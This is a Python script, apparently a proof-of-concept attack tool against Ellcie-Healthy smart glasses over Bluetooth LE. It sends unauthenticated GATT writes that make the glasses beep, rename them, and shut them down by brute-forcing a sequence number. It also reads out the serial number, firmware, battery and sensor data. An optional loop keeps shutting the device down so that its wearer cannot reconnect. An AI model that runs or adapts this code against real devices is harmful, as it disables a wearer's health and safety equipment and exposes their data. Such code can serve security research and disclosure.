import os
import time
from pwn import pwnlib, process, log, errno
import argparse
import subprocess
import re
from enum import Enum

class Action(Enum):
    BEEP = "BEEP"
    SHUTDOWN = "SHUTDOWN"
    CHANGE_DEVICE_NAME = "CHANGE_DEVICE_NAME"
    PRINT_INFOS = "PRINT_INFOS"
    @staticmethod
    def list():
        return list(map(lambda c: c.value, Action))


CMD_GATT_LOCATION = '0x001e'
args = ''

def isRoot():
    try:
        os.rename('/etc/foo', '/etc/bar')
    except IOError as e:
        if (e == errno.EPERM):
            return False
    return True

def initBluetooth():
    log.info("Turning on bluetooth")
    process('service bluetooth start', shell=True)
    log.info("Turning on adapter hci0")
    process('hciconfig hci0 up', shell=True)
    
def sendCommand(cmd, output):
    command = ['gatttool', '--device=' + args.address, '-t', 'random', '--char-write-req', '-a', CMD_GATT_LOCATION, '-n', cmd]
    subprocess.run(command)
    if output == True:
        log.info("Sending command 0x" + cmd)
    
def sendChangeNameCmd(newName):
    command = ['gatttool', '--device=' + args.address, '-t', 'random', '--char-write-req', '-a', '0x007', '-n', newName.encode('utf-8').hex()]
    subprocess.run(command)
    
def readAt(addr):
    command = ['gatttool', '--device=' + args.address, '-t', 'random', '--char-read', '-a', addr]
    try:
        r = subprocess.check_output(command)    
    except subprocess.CalledProcessError as e:
        log.error("The glasses seems to be busy...")
        return    
    return r.decode("utf-8").replace("Characteristic value/descriptor: ", "")


def byteArrayToHexa(byteArray):
    toReturn = ''
    for b in byteArray:
        toReturn += "%X" % (b & 0xff)
    return toReturn

 
def beepGlasses(): 
    sendCommand(byteArrayToHexa([120, -93]), True)
    log.success("Rocking the glasses")

def shutdownGlasses(): 
    log.info("This method requires bruteforcing mSeqNbCommand... doing so")
    with log.progress('Sending shutdown BLE packet... if I get stuck, press Ctrl+C.') as p:
        for i in range(0, 127):
            p.status(" Packet n°%i" % i)
            sendCommand(byteArrayToHexa([i, -64]), False)
            time.sleep(0.5)        
    log.success("Glasses are down. Have you heard that pretty noise ?")
     
def changeDeviceName():
    log.success("Retreived current device name : " +  bytearray.fromhex(readAt("0x007")).decode())
    log.info("Changing device name to...")     
    newName = input("--> : ")
    sendChangeNameCmd(newName)
    time.sleep(1)
    log.success("Done ! Getting new name : " +  bytearray.fromhex(readAt("0x007")).decode())
    

def printInfos():
    log.info("Retreiving informations...")
    print("\n")
    log.success("Retreived firmware version : " +  bytearray.fromhex(readAt("0x0014")).decode())
    log.success("Retreived risk level : " + (readAt("0x0037")))
    log.success("Retreived serial number : " +  bytearray.fromhex(readAt("0x0012")).decode())
    log.success("Retreived battery level : " + str(int(readAt("0x0017"), 16)) + "%")
    log.success("Retreived ambiant humidity : " + str(int(readAt("0x002b").replace("00",""), 16))+ "%")
    log.success("Retreived ambiant temperature : " + str(int(readAt("0x0028").replace("00",""), 16))+ "°C")
  #  log.success("Retreived number of walks : " + str(int((readAt("0x0025").replace("00","").replace("\n","")), 16))+ " walks")
     
    
     
def doAction():
    if args.action == Action.BEEP.name:
        beepGlasses()
    if args.action == Action.SHUTDOWN.name:
        shutdownGlasses()
    if args.action == Action.PRINT_INFOS.name:
        printInfos()
    if args.action == Action.CHANGE_DEVICE_NAME.name:
        changeDeviceName()
    
     
if(isRoot()):
    parser = argparse.ArgumentParser(description='Ellcie-Healthy glasses - Remote Command Execution')
    parser.add_argument('--address', dest='address',help='Glasses BLE addresses', default='E7:60:74:B4:98:3E', required=True)
    parser.add_argument('--action', dest='action',help='Action 30to be executed', choices=Action.list(), required=True)
    parser.add_argument('--init', dest='initbluetooth',help='Should the script activate bluetooth', choices=['1','0'], default='0')
    parser.add_argument('--keepsending', dest='keepsending',help='Should we keep sending the request ? Doing so will constantly send the action.' 
                        ' That means for example if you jam the device and send the shutdown request, the user won\'t be'
                        ' able to reconnect again, as the device with again and again shutdown.', choices=['1','0'], default='0')
    
    args = parser.parse_args()
    print("Ellcie-Healthy glasses - Remote Command Execution\n")
    
    if args.initbluetooth == '1':
        initBluetooth()
        
    if args.keepsending == '1':
        log.warning("Keep sending the action...")
        while True:
            doAction()
    else:
        log.info("Sending the order only once")
        doAction()
        
    
else:
    log.warn("You must be root. Run sudo please")

print("\n")
